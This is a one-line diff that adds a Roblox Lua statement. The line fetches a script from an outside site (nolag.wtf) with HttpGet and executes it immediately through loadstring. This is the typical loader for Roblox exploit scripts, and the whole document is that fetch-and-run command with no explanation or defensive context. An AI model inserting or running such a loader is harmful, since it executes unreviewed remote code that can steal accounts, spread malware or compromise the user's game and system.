@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://nolag.wtf/script.lua"))()
